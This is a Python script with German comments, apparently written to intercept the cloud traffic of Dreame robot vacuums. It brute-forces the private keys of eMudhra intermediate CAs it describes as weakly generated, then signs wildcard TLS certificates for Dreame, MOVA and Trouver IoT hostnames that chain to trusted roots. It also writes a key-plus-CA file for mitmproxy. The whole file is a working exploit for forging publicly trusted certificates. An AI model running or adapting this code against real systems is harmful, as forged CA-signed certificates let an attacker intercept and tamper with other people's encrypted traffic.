#!/usr/bin/env python3
"""
Erzeugt aus den acht kompromittierten eMudhra-Intermediate-CAs
(https://emudhra.we-have-a-problem.com/) lokale Signatur-Schluessel.

Die privaten Schluessel sind < 256 und damit aus dem oeffentlichen
Zertifikat rekonstruierbar (schwache P-384 Key-Generierung, Okt 2026).
Damit lassen sich Leaf-Zertifikate fuer beliebige Hostnamen signieren,
die zu einem Root im Trust-Store des Ziels verketten.

Output:
  certs/<name>__<issuer>.pem   key + intermediate (+ cross-sign)
  certs/leaf_<issuer>.pem      Wildcard-Leaf + Intermediate (fullchain)
  certs/leaf_<issuer>.key      Leaf-Key
  mitmproxy-ca.pem             key + intermediate (nur als Referenz)
"""
from __future__ import annotations

import json
import subprocess
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

HERE = Path(__file__).resolve().parent
SRC = HERE / "src" / "impacted-intermediates.json"
OUT = HERE / "certs"

# Hostnamen, die der Roboter (und die App) typischerweise anspricht.
SANS = [
    "*.iot.dreame.tech",
    "iot.dreame.tech",
    # MQTT-Shard, z.B. 10000.mt.eu.iot.dreame.tech:19973
    "*.mt.eu.iot.dreame.tech",
    "*.mt.us.iot.dreame.tech",
    "*.mt.sg.iot.dreame.tech",
    "*.mt.kr.iot.dreame.tech",
    "*.mt.cn.iot.dreame.tech",
    "*.mt.in.iot.dreame.tech",
    "*.mt.ru.iot.dreame.tech",
    "*.dreame.tech",
    "dreame.tech",
    "*.iot.dreametech.com",
    "dreametech.com",
    "*.iot.mova-tech.com",
    "iot.mova-tech.com",
    "*.iot.trouver-tech.com",
    "iot.trouver-tech.com",
]


def recover_d(pub_numbers: ec.EllipticCurvePublicNumbers) -> int | None:
    for d in range(1, 256):
        cand = ec.derive_private_key(d, ec.SECP384R1()).public_key().public_numbers()
        if cand == pub_numbers:
            return d
    return None


def pem_key(key) -> bytes:
    return key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    )


def build_leaf(inter: x509.Certificate, key, sans: list[str]) -> tuple[bytes, bytes]:
    leaf_key = ec.generate_private_key(ec.SECP384R1())
    now = datetime.now(timezone.utc)
    subject = x509.Name(
        [x509.NameAttribute(NameOID.COMMON_NAME, sans[0].replace("*.", "wildcard."))]
    )
    try:
        issuer_ski = inter.extensions.get_extension_for_class(
            x509.SubjectKeyIdentifier
        ).value
        aki = x509.AuthorityKeyIdentifier.from_issuer_subject_key_identifier(issuer_ski)
    except x509.ExtensionNotFound:
        aki = x509.AuthorityKeyIdentifier.from_issuer_public_key(inter.public_key())

    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(inter.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName(s) for s in sans]), critical=False
        )
        .add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False
        )
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(aki, critical=False)
        .sign(private_key=key, algorithm=hashes.SHA384())
    )
    return (
        cert.public_bytes(serialization.Encoding.PEM),
        pem_key(leaf_key),
    )


def main() -> int:
    if not SRC.exists():
        print(f"fehlt: {SRC}", file=sys.stderr)
        return 1

    OUT.mkdir(parents=True, exist_ok=True)
    entries = json.loads(SRC.read_text())

    by_name: dict[str, list[dict]] = {}
    for e in entries:
        by_name.setdefault(e["name"], []).append(e)

    for name, variants in by_name.items():
        d = None
        for v in variants:
            cert = x509.load_pem_x509_certificate(v["pem"].encode())
            d = recover_d(cert.public_key().public_numbers())
            if d is not None:
                break
        if d is None:
            print(f"[!] kein schwacher Key fuer {name}", file=sys.stderr)
            continue

        key = ec.derive_private_key(d, ec.SECP384R1())
        print(f"[+] {name:20} d={d:3d}")

        # Direkt von eMudhra ausgestellt + Sectigo-Cross-Sign
        for v in variants:
            cert = x509.load_pem_x509_certificate(v["pem"].encode())
            tag = "emudhra" if v["issuer_operator"] == "eMudhra" else v["issuer_operator"].lower()
            fn = OUT / f"{name.replace(' ', '_')}__{tag}.pem"
            fn.write_bytes(pem_key(key) + v["pem"].encode())
            fn.chmod(0o600)

            if tag != "emudhra":
                # Cross-Sign: Leaf + Intermediate -> verifiziert gegen den Root des Cross-Signers
                leaf_pem, leaf_key_pem = build_leaf(cert, key, SANS)
                stem = f"leaf_{name.replace(' ', '_')}__{tag}"
                (OUT / f"{stem}.pem").write_bytes(leaf_pem + v["pem"].encode())
                (OUT / f"{stem}.key").write_bytes(leaf_key_pem)
                (OUT / f"{stem}.key").chmod(0o600)
                (OUT / f"{stem}-leaf-only.pem").write_bytes(leaf_pem)
                print(f"    -> certs/{stem}.pem (fullchain)")

    # Referenzdatei fuer mitmproxy-artige Tools (key + CA-Zertifikat)
    ref = OUT / "EM_DV_TLS_CA-G3B__sectigo.pem"
    if ref.exists():
        raw = ref.read_bytes()
        key_pem = raw.split(b"-----END EC PRIVATE KEY-----")[0] + b"-----END EC PRIVATE KEY-----\n"
        (HERE / "mitmproxy-ca.pem").write_bytes(key_pem + raw.split(b"-----END EC PRIVATE KEY-----")[1].lstrip())
        (HERE / "mitmproxy-ca.pem").chmod(0o600)

    print(f"\nfertig: {OUT}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
